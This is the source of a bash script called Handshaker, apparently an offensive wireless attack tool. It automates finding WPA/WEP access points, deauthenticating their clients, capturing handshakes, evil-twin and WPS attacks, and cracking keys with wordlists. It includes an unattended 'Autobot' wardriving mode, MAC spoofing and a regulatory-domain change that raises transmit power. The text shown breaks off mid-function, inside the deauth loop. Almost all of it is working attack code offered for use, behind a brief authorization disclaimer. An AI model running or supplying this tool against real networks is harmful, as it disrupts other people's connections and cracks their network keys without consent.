#!/bin/bash

## Handshaker Copyright 2013, d4rkcat (thed4rkcat@yandex.com)
#
## This program is free software: you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation, either version 3 of the License, or
## (at your option) any later version.
#
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License at (http://www.gnu.org/licenses/) for
## more details.

fhelp()																	#Help
{
	echo $RST""" 
HandShaker - Detect, deauth, capture, crack WPA/2 handshakes, WPS Pins and WEP Keys automagically.  
 by d4rkcat <thed4rkcat@yandex.com>
             
	Usage: 	handshaker <Method> <Options>
	
	Method:
		-a - Autobot or wardriving mode
		-e - Search for AP by partial unique ESSID
		-l - Scan for APs and present a target list
		-c - Crack handshake from pcap
		-r - WPS Cracking with reaver
		
	Options:
		-i  - Wireless Interface card
		-i2 - Second wireless card (better capture rate)
		-w  - Wordlist to use for cracking
		-o  - Save handshakes to custom directory
		-d  - Deauth packets sent to each client (default 1)
		-p  - Only attack clients above this power level
		-g  - Use android GPS to record AP location
		-B  - Use besside-ng to capture handshakes
		-E  - Use evil twin AP to capture handshakes
		-M  - Use mdk3 for deauth (default aireplay-ng)
		-T  - Attempts to capture per AP (default 3)
		-W  - Attack WEP encrypted APs
		-s  - Silent
		-h  - This help
			
	Examples: 
		 handshaker -a -i wlan0 -T 5			 ~ Autobot mode on wlan0 and attempt 5 times.
		 handshaker -e Hub3-F -w wordlist.txt	 	 ~ Find AP like 'Hub3-F' and crack with wordlist.
		 handshaker -l -o out/dir			 ~ List all APs and save handshakes to out/dir.
		 handshaker -c handshake.cap -w wordlist.txt	 ~ Crack handshake.cap with wordlist.
		 
 all your AP are belong to us..
"
	exit
}

fstart()																#Startup
{
	COLOR="tput setab"
	COLOR2="tput setaf"
	RED=$(echo -e "\e[1;31m")
	BLU=$(echo -e "\e[1;36m")
	GRN=$(echo -e "\e[1;32m")
	RST=$(echo -e "\e[0;0;0m")
	LIST="""aircrack-ng
beep
bc
mdk3
gpsd 
cowpatty
pyrit"
	if [ $(cat $HOME/handshaker_check | grep user_has_agreed) -z ] 2> /dev/null
	then
		echo $RED" [*] DO NOT USE THIS TOOL ON WEBSITES OR USERS UNLESS EXPLICITLY AUTHORIZED TO DO SO."
		echo $RED" [*] BY USING THIS TOOL YOU AGREE NOT TO BREAK ANY LOCAL OR FEDERAL LAWS WHILE USING THIS TOOL."
		echo $RED" [*] THE AUTHOR IS NOT RESPOSIBLE FOR ANY LOSS OR DAMAGES CAUSED BY THIS TOOL.";echo
		read -p " [>] Do you agree? [y/n]:" USE
		if [ $USE = 'y' ] || [ $USE = 'Y' ]
		then
			echo 'user_has_agreed' > $HOME/handshaker_check
			clear
		else
			echo 'user_has_not__agreed' > $HOME/handshaker_check
			echo $RST
			exit
		fi
		clear
	fi

	echo $BLU"""NNNNDND88O~~~~~~~~~~~~~~~~~~=~~==~~===~=============+====+==++==++:ZOOO?8D8O.OOO
DNDDDDD8DDD8O=~~~~~~~~~~~~~~~~~~~~=~~~~~~===================$7?+.$D.Z,$DDODINZO8
NND88D8NDDDDO888Z~~~~~~~~~~~~~~~~~~~~~~~==~~=~~==~=======,,Z8DD8D8DNNND8ZOONNND?
MND8NNNDDN8DD8O8O8OZ~~~~~~~~~~~~~~~~~~7Z$?I?+====~~~===?,,:8DZOO+IDNNNDDDI+77+~7
NNDMNNNDDNNDNNNNN8D8OZ~~~~~~~~:~~~~7$:::~~~=~:+++++++I?7::~?DND8+ONNNNND888DN8DZ
NNNNMNMDNNNMDNNDDNDD.....::~~:~=IZ=++?+=?I?I+~~=+???77$Z8:~I8OZ8D$DD?~.:=888DZZN
NNMNMNNNNMDN8NNDNDD....:===~~7=~==++==+II77$?+=::7I+II?7Z:~+N7Z~$NNNNDDDNNNNDD8,
MNNNMNMNNNDNMDNDND,:..,=+++?+III?+==~+7O$$ONNI?+~~7+?I7$Z~:=?788Z8Z...$NDDOZ8DD8
MNNNNNNNDNNNNNDNN~,,,,+++II7$$7?+==+8Z$7?7$ZIO7$II+?I?I$$7::+8~..?N8D$+$888O8D~O
NMMMNDNNNNDNNNNN,,:,,+??I77I77?I?I8OZZII+?IIII+??I??II???O8:~+ZZDND$DDNN8.7O?MN?
NNNNNNNNDNDMNDN,,,,,++?IIII7III$88OOZZ$7IIII??7$+?+?I?I+?Z7,::~$ND8O.:MNNOO8MO8D
NMMNNNNNNNNMNMN::.,+++II777I7ODOOOZI$$OZZ??II=?II???+++??+?::::=NDO,~Z$NO8O8ND.O
NNNNNNNNNNNNNNMM,,,,,,:I$777DOZZ$IIIO8D8$?++??I$I?????++++::::::8ND+Z8DDZ:Z?Z+?~
DNNNNNNNNNNNNMM,,,,,,,,,,?ZO8O$7I?NMD88Z7$II??7IIIII?I++=:,::::::ODOIIZ==I~~~~~~
,,8NNNNDNDNNNN~,,,,,,,,,,,8OOZII$DD8$O77IIZI?II=:~:?+,7=,,,,:,::::~+7I:::::~:~~~
,,,,,8NNMNNDN,,,,,,,,,,,,:$7?~+?88D$$IIDD88+,~8?~:=:~,,,,,,,,,,,,:::::::::::~::~
,,,,,,,,8DND,,,,,,,,,,,,,,=~,,,I8Z$I?DO$88D=~:~=7+=~,,,,,,,,,,,,,,,,::::::::::::
,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,?I?8OZ77ZO=I?==~~~,,,,,,,,,,,,,,,,,,,,,:::::::::
,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,$I?8OO+=~=~~~.,,,,,,,,,,,,,,,,,,,,,,::::::::
,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,..,.,+II?.=~,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,:,::
$RED _    _                    _   _____  _             _               
| |  | |                  | | / ____|| |           | |              
| |__| |  __ _  _ __    __| || (___  | |__    __ _ | | __ ___  _ __ 
|  __  | / _  ||  _ \  / _  | \___ \ |  _ \  / _  || |/ // _ \|  __|
| |  | || (_| || | | || (_| | ____) || | | || (_| ||   <|  __/| |   
|_|  |_| \__ _||_| |_| \__ _||_____/ |_| |_| \__ _||_|\_\\___| |_|   
                                                          
                                                         By d4rkcat..            
"
sleep 2
	for COMMAND in $LIST
	do
		if [ $(which $COMMAND) -z ] 2> /dev/null
		then
			clear
			echo $RED" [>] $GRN$COMMAND$RED was not found, install it now?$GRN [Y/n]"
			read -p "  >" DOINST
			case $DOINST in
			"")INST=1;;
			"Y")INST=1;;
			"y")INST=1
			esac
			if [ $INST = 1 ] 2> /dev/null
			then
				if [ $(whoami) = "root" ]
				then
					apt-get install $COMMAND
					if [ $(which $COMMAND) -z ] 2> /dev/null
					then
						echo $RED" [*] ERROR: $COMMAND could not be installed, please install manually"
					else
						echo " [*] $COMMAND Installed"
					fi
				else
					sudo apt-get install $COMMAND
					if [ $(which $COMMAND) -z ] 2> /dev/null
					then
						echo $RED" [*] ERROR: $COMMAND could not be installed, please install manually"
						sleep 0.4
					else
						echo " [*] $COMMAND Installed"
					fi
				fi
				INST=""
			fi
		fi
	done
	clear
	if [ $WEP = 1 ] 2> /dev/null
	then
		WPW='WEP';BESS=1;EVIL="";MDK=""
	else
		WPW='WPA'
	fi
	if [ $CRACK = 1 ] 2> /dev/null
	then
		if [ -f $PCAP ] 2> /dev/null
		then
			fcrack
		else
			echo $RED;$COLOR2 9;$COLOR 1
			echo " [*] ERROR: There is no file at $PCAP. "$RST
			echo
			exit
		fi
	fi
	if [ $NIC2 -z ] 2> /dev/null
	then
		if [ $EVIL = 1 ] 2>/dev/null
		then
			echo $RED" [*]$GRN Evil twin$RED attack requires$GRN two$RED wireless cards, turning it off..."
			EVIL=""
		fi
	fi
	if [ $OUTDIR -z ] 2> /dev/null
	then
		mkdir -p $HOME/Desktop/cap
		mkdir -p $HOME/Desktop/cap/handshakes
		OUTDIR=$HOME/Desktop/cap/handshakes
	else
		if [ $(echo $OUTDIR | tail -c 2) = '/' ] 2> /dev/null
		then
			OUTDIR=${OUTDIR:0:-1}
		fi
		mkdir -p $OUTDIR
	fi

	touch $OUTDIR/got
	MNUM=0
	if [ $DO -z ] 2> /dev/null
	then
		DO=E
	fi
	if [ $DO = 'E' ] 2> /dev/null
	then
		if [ $PARTIALESSID -z ] 2> /dev/null
		then	
			fhelp
		fi
	fi
	iw reg set BO
	if [ $PACKS -z ] 2> /dev/null
	then
		PACKS=1
	fi
	if [ $GPS -z ] 2> /dev/null
	then		
		CHKILL=$(airmon-ng check kill | grep trouble)
		if [ $CHKILL -z ] 2> /dev/null
		then
			A=1
		else
			echo $RED" [*] $CHKILL"
			echo $GRN" [*] Killing all those processes..."
		fi
	fi
	MONS="$(ifconfig | grep mon | cut -d ' ' -f 1)"
	for MON in $MONS
	do
		airmon-ng stop $MON | grep removedgdan
	done
	if [ $NIC -z ] 2> /dev/null
	then
		clear
		$COLOR 4;echo $RED" [>] Which interface do you want to use?: ";$COLOR 9
		echo
		WLANS="$(ifconfig | grep wlan | cut -d ' ' -f 1)"
		for WLAN in $WLANS
		do
			echo " [>] $WLAN"
		done
		echo $BLU
		read -p "  > wlan" NIC
		if [ ${NIC:0:4} = 'wlan' ] 2> /dev/null
		then
			A=1
		else
			NIC="wlan"$NIC
		fi
		echo
		echo $GRN;MON1=$(airmon-ng start $NIC | grep monitor | cut -d ' ' -f 5 | head -c -2);echo " [*] Started $NIC monitor on $MON1"
	else
		echo $GRN;MON1=$(airmon-ng start $NIC 1 | grep monitor | cut -d ' ' -f 5 | head -c -2);echo " [*] Started $NIC monitor on $MON1"
	fi
	if [ $(ifconfig | grep $MON1) -z ] 2> /dev/null
	then
		echo $RED;$COLOR 1;$COLOR2 9;echo " [*] ERROR: $NIC card could not be started! "$RST
		fexit
	fi
	if [ $NIC2 -z ] 2> /dev/null
	then
		A=1
	else
		echo $GRN;MON2=$(airmon-ng start $NIC2 6 | grep monitor | cut -d ' ' -f 5 | head -c -2);echo " [*] Started $NIC2 monitor on $MON2"
		if [ $(ifconfig | grep $MON2) -z ] 2> /dev/null
		then
			echo $RED;$COLOR 1;$COLOR2 9;echo " [*] ERROR: $NIC2 card could not be started! "$RST
			fexit
		fi
	fi
	
	if [ $DO = 'R' ] 2> /dev/null
	then
		freaver
	fi
	
	if [ $GPS = 1 ] 2> /dev/null
	then
		fstartgps
	fi
	
	if [ $DO = 'A' ] 2> /dev/null
	then
		echo $RST
		if [ $TRIES -z ] 2> /dev.null
		then
			TRIES=3
		fi
		fbotstart
	fi
	
	MONS="$(ifconfig | grep mon | cut -d ' ' -f 1)"
	echo
	echo $BLU" [*] Changing monitor device MAC addresses. "$GRN
	echo
	NICS="$(ifconfig | grep wlan | cut -d ' ' -f 1)"
	for CARD in $NICS
	do
		ifconfig $CARD down
		iwconfig $CARD txpower 30 2> /dev/null
		sleep 0.5
		ifconfig $CARD up
	done
		
	for MON in $MONS
	do
		ifconfig $MON down
		echo " [*] $(macchanger -a $MON | grep New | tr -d 'New' | sed 's/^ *//g')"
		echo " [*] $MON MAC address changed and power boosted. "
		sleep 0.5			
		ifconfig $MON up
		echo
	done
	echo $RST
	
	if [ $DO = 'L' ] 2> /dev/null
	then
		flistap
	else
		fapscan
	fi
}

fapscan()																#Grep for AP ESSID
{
	clear
	rm -rf $HOME/tmp*
	if [ $NIC2 -z ] 2> /dev/null
	then
		gnome-terminal -t "Scanning for $WPW.." --geometry=100x20+0+320 -x airodump-ng $MON1 -a -w $HOME/tmp -o csv --encrypt $WPW&
	else
		gnome-terminal -t "Scanning for $WPW.." --geometry=100x20+0+200 -x airodump-ng $MON1 -a -w $HOME/tmp -o csv --encrypt $WPW&
		gnome-terminal -t "Scanning for $WPW.." --geometry=100x20+0+600 -x airodump-ng $MON2 -a -w $HOME/tmpe -o csv --encrypt $WPW&
	fi
	echo $BLU" [*] Scanning for AP's with names like $GRN$PARTIALESSID$BLU [*] "$RST
	while [ $DONE -z ] 2> /dev/null
	do
		sleep 0.3
		if [ -f $HOME/tmp-01.csv ] 2> /dev/null
		then
			if [ -f $HOME/tmpe-01.csv ]
			then
				TMPF="$(cat $HOME/tmp-01.csv $HOME/tmpe-01.csv | sort -u)"
			else
				TMPF="$(cat $HOME/tmp-01.csv)"
			fi
			DONE=$(echo "$TMPF" | grep $PARTIALESSID)
			ESSID=$(echo "$TMPF" | grep $PARTIALESSID | cut -d ',' -f 14 | head -n 1)
			BSSID=$(echo "$TMPF" | grep "$ESSID" | cut -d ',' -f 1 | head -n 1)
		fi
		if [ $ESSID -z ] 2> /dev/null
		then
			DONE=""
		fi
		if [ $BSSID -z ] 2> /dev/null
		then
			DONE=""
		fi
	done
	sleep 0.5
	killall airodump-ng
	ESSID=${ESSID:1}
	CHAN=$(echo "$TMPF" | grep "$ESSID" | cut -d ',' -f 4 | head -n 1)
	CHAN=$((CHAN + 1 - 1))
	echo "$TMPF" > $HOME/tmp-01.csv
	fclientscan
}

flistap()																#List all APs
{
	if [ $NIC2 -z ] 2> /dev/null
	then
		gnome-terminal -t "Scanning for $WPW.." --geometry=100x20+0+320 -x airodump-ng $MON1 -a -w $HOME/tmp -o csv --encrypt $WPW&
	else
		gnome-terminal -t "Scanning for $WPW.." --geometry=100x20+0+200 -x airodump-ng $MON1 -a -w $HOME/tmp -o csv --encrypt $WPW&
		gnome-terminal -t "Scanning for $WPW.." --geometry=100x20+0+600 -x airodump-ng $MON2 -a -w $HOME/tmpe -o csv --encrypt $WPW&
	fi
	clear
	echo $BLU" [*] Scanning for$GRN All $WPW APs$BLU, Please wait.. "$RED
	sleep 10
	killall airodump-ng
	if [ $NIC2 -z ] 2> /dev/null
	then
		echo "$(cat $HOME/tmp-01.csv | grep $WPW | cut -d ',' -f 14)" > $HOME/tmp2
	else
		echo "$(cat $HOME/tmp-01.csv | grep $WPW | cut -d ',' -f 14)" > $HOME/tmp2
		echo "$(cat $HOME/tmpe-01.csv | grep $WPW | cut -d ',' -f 14)" >> $HOME/tmp2
		UNIQ=$(cat $HOME/tmp2 | sort -u)
		echo "$UNIQ" > $HOME/tmp2
	fi
	LNUM=$(cat $HOME/tmp2 | wc -l)
	clear
	echo $BLU" [*] $RED$LNUM$BLU APs found:"$GRN
	LNUM=0
	while read AP
	do
		LNUM=$((LNUM + 1))
		echo " [$LNUM] $AP"
	done < $HOME/tmp2

	echo $BLU" [>] Please choose an AP"
	read -p "  >" AP
	echo $RST
	if [ $NIC2 -z ] 2> /dev/null
	then
		FCAT=$(cat $HOME/tmp-01.csv)
	else
		FCAT=$(cat $HOME/tmp-01.csv $HOME/tmpe-01.csv)
		echo "$FCAT" > $HOME/tmp-01.csv
	fi
	ESSID=$(cat $HOME/tmp2 | sed -n "$AP"p)
	ESSID=${ESSID:1}
	BSSID=$(echo "$FCAT" | grep $WPW | grep "$ESSID" | cut -d ',' -f 1 | head -n 1)
	CHAN=$(echo "$FCAT" | grep $WPW | grep "$ESSID" | cut -d ',' -f 4 | head -n 1)
	CHAN=$((CHAN + 1 - 1))
	fclientscan
}

fclientscan()															#Find active clients
{
	CNT="0"
	clear
	if [ $EVIL = 1 ] 2> /dev/null
	then
		CIPHER=$(cat $HOME/tmp-01.csv | grep "$ESSID" | cut -d ',' -f 7 | head -n 1)
		CIPHER=${CIPHER:1}
		MIXED=$(echo $CIPHER | cut -d ' ' -f 2)
		CIPHER=$(echo $CIPHER | cut -d ' ' -f 1)
		WPA=$(cat $HOME/tmp-01.csv | grep "$ESSID" | cut -d ',' -f 6 | head -n 1)
		WPA=${WPA:1}
		if [ $MIXED = $CIPHER ] 2> /dev/null
		then
			EVIL=1
		else
			echo $RED" [*] $GRN$ESSID$RED is Mixed CCMP/TKIP encryption,$GRN Evil Twin$RED is unlikely to work, turning it off"
			EVIL=""
		fi
	fi
	echo -e $RED""" [*] Attacking:\t\t $GRN$ESSID$RED
 [*] BSSID:\t\t $GRN$BSSID$RED
 [*] Channel:\t\t $GRN$CHAN$RED"
	echo
	rm -rf $HOME/tmp* 2> /dev/null
	if [ $BESS -z ] 2> /dev/null
	then
		echo $BLU" [*] Please wait while I search for$GRN active clients$BLU.. [*] "
	else
		fautocap
	fi
	DONE=""
	sleep 0.4
	if [ $EVIL -z ] 2> /dev/null
	then
		if [ $NIC2 -z ] 2> /dev/null
		then
			gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+320 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
		else
			gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+200 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
			gnome-terminal -t "$NIC2 Sniping $ESSID" --geometry=100x20+0+600 -x airodump-ng $MON2 --bssid $BSSID -c $CHAN -w $HOME/tmpe&
		fi
	else
		case $CIPHER in
			"CCMP")CIPHER=4;;
			"TKIP")CIPHER=2
		esac
		case $WPA in
			"WPA")BARG='-z ';;
			"WPA2")BARG='-Z '
		esac
		PART1=${RANDOM:0:2}
		gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+200 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
	fi
	
	while [ $CLIENT -z ] 2> /dev/null
	do
		sleep 0.5
		CLIENT=$(cat $HOME/tmp-01.csv 2> /dev/null | grep Station -A 10 | grep "$BSSID" | grep : | cut -d ',' -f 1 | head -n 1)
		if [ $CLIENT -z ] 2> /dev/null
		then
				CLIENT=$(cat $HOME/tmpe-01.csv 2> /dev/null | grep Station -A 10 | grep "$BSSID" | grep : | cut -d ',' -f 1 | head -n 1)
		fi
	done
	fautocap
}

fbotstart()																#Startup Autobot
{	
	killall airodump-ng 2> /dev/null
	MONS="$(ifconfig | grep mon | cut -d ' ' -f 1)"
	NICS="$(ifconfig | grep wlan | cut -d ' ' -f 1)"
	echo $BLU" [*] Changing monitor device MAC addresses. "
	echo $GRN
	for CARD in $NICS
	do
		ifconfig $CARD down
		iwconfig $CARD txpower 30 2> /dev/null
		sleep 0.5
		ifconfig $CARD up
	done
		
	for MON in $MONS
	do
		ifconfig $MON down
		echo " [*] $(macchanger -a $MON | grep New | tr -d 'New' | sed 's/^ *//g')"
		if [ $PWRCHK -z ] 2> /dev/null
		then
			echo " [*] $MON MAC address changed and power boosted. "
		else
			echo " [*] $MON MAC address changed "
		fi
		ifconfig $MON up
		echo
	done
	$COLOR 9
	if [ $PUTEVIL = 1 ] 2> /dev/null
	then
		EVIL=1
	fi
	clear
	echo $BLU" [>]$GRN AUTOBOT ENGAGED$BLU [<] "
	echo
	echo " [*]$GRN Scanning$BLU for new active clients.. ";$COLOR2 9
	if [ $NIC2 -z ] 2> /dev/null
	then
		gnome-terminal -t "$NIC Scanning for $WPW.." --geometry=100x20+0+200 -x airodump-ng $MON1 -f 400 -a -w $HOME/tmp -o csv --encrypt $WPW&
	else
		gnome-terminal -t "$NIC Scanning for $WPW.." --geometry=100x20+0+200 -x airodump-ng $MON1 -f 400 -a -w $HOME/tmp -o csv --encrypt $WPW&
		gnome-terminal -t "$NIC2 Scanning for $WPW.." --geometry=100x20+0+600 -x airodump-ng $MON2 -f 400 -a -w $HOME/tmpe -o csv --encrypt $WPW&
	fi
	DONE=""
	PWRCHK=1;RESETCNT=1;MNUM=0;LNUM=0
	GOT=$(cat $OUTDIR/got);echo "$GOT" | sort -u > $OUTDIR/got
	modprobe pcspkr
	fautobot
}

fautobot()																#Automagically find new target clients
{	
	sleep 0.7
	BSSIDS=""
	if [ $RESETCNT -gt 80 ] 2> /dev/null
	then
		killall airodump-ng
		sleep 0.7
		rm -rf $HOME/tmp*
		if [ $NIC2 -z ] 2> /dev/null
		then
			gnome-terminal -t "$NIC Scanning for $WPW.." --geometry=100x20+0+200 -x airodump-ng $MON1 -f 400 -a -w $HOME/tmp -o csv --encrypt $WPW&
		else
			gnome-terminal -t "$NIC Scanning for $WPW.." --geometry=100x20+0+200 -x airodump-ng $MON1 -f 400 -a -w $HOME/tmp -o csv --encrypt $WPW&
			gnome-terminal -t "$NIC2 Scanning for $WPW.." --geometry=100x20+0+600 -x airodump-ng $MON2 -f 400 -a -w $HOME/tmpe -o csv --encrypt $WPW&
		fi
		MNUM=0
		LNUM=0
		RESETCNT=1
	fi
	
	if [ $WEP -z ] 2> /dev/null
	then
		if [ ! -f $HOME/tmp-01.csv ] 2> /dev/null
		then
			sleep 1
			fautobot
		else
			echo "$(cat $HOME/tmp-01.csv | grep 'Station' -A 10 | grep : | cut -d ',' -f 6 | tr -d '(not associated)' | sed '/^$/d' | sort -u)" > $HOME/tmp2
		fi
		if [ -f $HOME/tmpe-01.csv ] 2> /dev/null
		then
			echo "$(cat $HOME/tmpe-01.csv | grep 'Station' -A 10 | grep : | cut -d ',' -f 6 | tr -d '(not associated)' | sed '/^$/d' | sort -u)" >> $HOME/tmp2
			UNIQ="$(cat $HOME/tmp2 | sort -u)"
			echo "$UNIQ" > $HOME/tmp2
		fi
	else
		sleep 1
		if [ $NIC2 -z ] 2> /dev/null
		then
			echo "$(cat $HOME/tmp-01.csv | grep $WPW | cut -d ',' -f 1 | sort -u)" > $HOME/tmp2
		else
			echo "$(cat $HOME/tmp-01.csv $HOME/tmpe-01.csv | grep $WPW | cut -d ',' -f 1 | sort -u)" > $HOME/tmp2
		fi
	fi

	if [ $(cat $HOME/tmp2) -z ] 2> /dev/null
	then
		RESETCNT=$((RESETCNT + 1))
		fautobot
	fi
	
	while read BSSID
	do
		if [ $BSSID -z ] 2> /dev/null
		then
			A=1
		else
			if [ $(cat $OUTDIR/got | grep "$BSSID") -z ] 2> /dev/null
			then
				if [ $BSSIDS -z ] 2> /dev/null
				then
					BSSIDS=$BSSID
				else
					BSSIDS="$BSSIDS\n$BSSID"
				fi
			fi
		fi
	done < $HOME/tmp2

	if [ $BSSIDS -z ] 2> /dev/null
	then
		RESETCNT=$((RESETCNT + 1))
		fautobot
	fi
	BSSIDS=$(echo -e "$BSSIDS" | sort -u)
	if [ $NIC2 -z ] 2> /dev/null
	then
		FCAT="$(cat $HOME/tmp-01.csv)"
	else
		FCAT="$(cat $HOME/tmp-01.csv $HOME/tmpe-01.csv)"
	fi
	if [ $WEP = 1 ] 2> /dev/null
	then
		while [ $WDONE -z ] 2> /dev/null
		do
			sleep 0.5
			WDONE=1
			ESSID=$(echo "$FCAT" | grep "$BSSID" | cut -d ',' -f 14 | sed '/^$/d' | head -n 1)
			ESSID=${ESSID:1}
			BSSID=$(echo "$BSSIDS" | sed -n 1p)
			CHAN=$(echo "$FCAT" | grep "$BSSID" | grep $WPW | cut -d ',' -f 4 | head -n 1)
			CHAN=$((CHAN + 1 - 1))
			if [[ $CHAN -gt 12 || $CHAN -lt 1 ]] 2> /dev/null
			then
					WDONE=""
			fi
			if [ $ESSID -z ] 2> /dev/null
			then
					WDONE=""
			elif [ $CHAN -z ] 2> /dev/null
			then
					WDONE=""
			fi
		done
		killall airodump-ng 2> /dev/null
		iw $MON1 set channel $CHAN
		sleep 0.5
		fautocap
	fi
	for BSSID in $BSSIDS
	do
		if [ $BSSID -z ] 2> /dev/null
		then
			CLIENT=""
		else
			CLIENT=$(echo "$FCAT" | grep Station -A 7 | grep "$BSSID" | cut -d ',' -f 1 | sed '/^$/d' | head -n 1)
		fi
		if [ $CLIENT -z ] 2> /dev/null
		then
			SDONE=""
		else
			SDONE=1
			POWER=$(echo "$FCAT" | grep "$CLIENT" | cut -d ',' -f 4 | head -n 1)
			POWER=${POWER:2}
			ESSID=$(echo "$FCAT" | grep "$BSSID" | cut -d ',' -f 14 | sed '/^$/d' | head -n 1)
			ESSID=${ESSID:1}
			if [ $POWER -z ] 2> /dev/null
			then
				SDONE=""
			elif [ $ESSID -z ] 2> /dev/null
			then
				SDONE=""
			fi
		fi
		if [ $SDONE = 1 ] 2> /dev/null
		then
			break
		fi
	done
	
	if [ $SDONE -z ] 2> /dev/null
	then
		RESETCNT=$((RESETCNT + 1))
		fautobot
	fi
	
	if [ $POWERLIMIT -z ] 2> /dev/null
	then
		A=1
	else
		if [ $POWER -gt $POWERLIMIT ] 2> /dev/null
		then
			fautobot
		fi
	fi
	CHAN=$(echo "$FCAT" | grep "$BSSID" | grep $WPW | cut -d ',' -f 4 | head -n 1)
	CHAN=$((CHAN + 1 - 1))
	if [[ $CHAN -gt 12 || $CHAN -lt 1 ]]
	then
		fautobot
	fi
	clear
	echo $RED" [>]$GRN AUTOBOT$RED LOCKED IN [<] "
	echo
			echo $GRN""" [*] Client found!:
 [*] ESSID: $ESSID
 [*] BSSID: $BSSID
 [*] Client: $CLIENT
 [*] Channel: $CHAN
 [*] Power: $POWER$RED
 [*] We need this handshake [*] "$RST

	if [ $BESS = 1 ] 2> /dev/null
	then
		killall airodump-ng
		fautocap
	fi
	if [ $EVIL = 1 ] 2> /dev/null
	then
		CIPHER=$(echo "$FCAT"| grep "$ESSID" | cut -d ',' -f 7 | head -n 1)
		CIPHER=${CIPHER:1}
		MIXED=$(echo $CIPHER | cut -d ' ' -f 2)
		CIPHER=$(echo $CIPHER | cut -d ' ' -f 1)
		if [ $MIXED = $CIPHER ] 2> /dev/null
		then
			EVIL=1
		else
			echo
			echo $RED" [*] $GRN$ESSID$RED is Mixed CCMP/TKIP encryption,$GRN Evil Twin$RED is unlikely to work, turning it off"
			echo
			PUTEVIL=1
			EVIL=""
		fi
		WPA=$(echo "$FCAT" | grep "$ESSID" | cut -d ',' -f 6 | head -n 1)
		WPA=${WPA:1}
	fi
	killall airodump-ng
	rm -rf $HOME/tmp*
	sleep 0.5
	if [ $NIC2 -z ] 2> /dev/null
	then
		iw $MON1 set channel $CHAN
	else
		iw $MON1 set channel $CHAN
		sleep 0.5
		iw $MON2 set channel $CHAN
	fi
	sleep 0.5
	if [ $EVIL -z ] 2> /dev/null
	then
		if [ $NIC2 -z ] 2> /dev/null
		then
			gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+320 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
		else
			gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+200 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
			gnome-terminal -t "$NIC2 Sniping $ESSID" --geometry=100x20+0+600 -x airodump-ng $MON2 --bssid $BSSID -c $CHAN -w $HOME/tmpe&
		fi
	else
		case $CIPHER in
			"CCMP")CIPHER=4;;
			"TKIP")CIPHER=2
		esac
		case $WPA in
			"WPA")BARG='-z ';;
			"WPA2")BARG='-Z '
		esac
		gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+200 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
	fi
	fautocap
}
		
fautocap()																#Deauth targets and collect handshakes
{
	DONE="";CLINUM=1;DISPNUM=1;DECNT=0
	if [ $SILENT -z ] 2> /dev/null
	then
		beep -f 700 -l 25;beep -f 100 -l 100;beep -f 1200 -l 15;beep -f 840 -l 40;beep -f 1200 -l 15
	fi
	while [ $DONE -z ] 2> /dev/null
	do
		if [ -f $HOME/tmp-01.csv ] 2> /dev/null
		then
			TARGETS="$(cat $HOME/tmp-01.csv | grep Station -A 10 | grep : | cut -d ',' -f 1 | sort -u)"
		fi
		if [ -f $HOME/tmpe-01.csv ] 2> /dev/null
		then
			TARGETS2="$(cat $HOME/tmpe-01.csv | grep Station -A 10 | grep : | cut -d ',' -f 1 | sort -u)"
			TARGETS="$TARGETS\n$TARGETS2"
			TARGETS=$(echo -e "$TARGETS" | sort -u)
		fi
				
		if [ $POWERLIMIT -z ] 2> /dev/null
		then
			A=1
		else
			if [ $NIC2 -z ] 2> /dev/null
			then
				TMPF="$(cat $HOME/tmp-01.csv)"
			else
				TMPF="$(cat $HOME/tmp-01.csv $HOME/tmpe-01.csv)"
			fi
			for OCLI in $TARGETS
			do
				POWER=$(echo "$TMPF" | grep "$OCLI" | cut -d ',' -f 4 | head -n 1)
				POWER=${POWER:2}
				echo "$OCLI $POWER" >> $HOME/tmpp
			done
				
			POWERLIST="$(cat $HOME/tmpp)"
			for OCLI in $POWERLIST
			do
				if [ $(echo $OCLI | cut -d ' ' -f 2) -le $POWERLIMIT ] 2> /dev/null
				then
					echo $(echo $OCLI | cut -d ' ' -f 1) >> tmpff
				fi
			done
			TARGETS="$(cat $HOME/tmpff)"
		fi
						
		clear
		if [ $DO = 'A' ] 2> /dev/null
		then
			echo $RED" [>]$GRN AUTOBOT$RED LOCKED IN [<] ";echo
		fi
		if [ $(echo $ESSID | wc -c) -ge 16 ] 2> /dev/null
		then
			TABS='\t'
		else
			if [ $(echo $ESSID | wc -c) -le 7 ]
			then
				TABS='\t\t\t'
			else
				TABS='\t\t'
			fi
		fi
		echo -e $RED" [*] Target ESSID:\t $GRN$ESSID$RED$TABS Loaded   [*] "
		echo -e " [*] Target BSSID:\t $GRN$BSSID$RED\t Loaded   [*]"$RST
		sleep 0.7
		if [ $TARGETS -z ] 2> /dev/null
		then
			TARGETS=$CLIENT
		fi
		if [ $BESS -z ] 2> /dev/null
		then
			if [ $NIC2 -z ] 2> /dev/null
			then
				if [ $MDK -z ] 2> /dev/null
				then
					MACNUM=0
					for CLIENT in $TARGETS
					do
						MACNUM=$((MACNUM + 1))
						echo
						aireplay-ng -0 $PACKS -a $BSSID -c $CLIENT $MON1 | grep sdvds&
						sleep $((PACKS + 1))'.5'
						echo -e $RED" [*]$GRN Deauth client $MACNUM:\t $CLIENT$RED\t Launched [*]"
						fanalyze
						if [ $GDONE = 1 ] 2> /dev/null
						then
							break
						fi
					done
					sleep 3
				else
					echo $BSSID > $HOME/BSSIDB
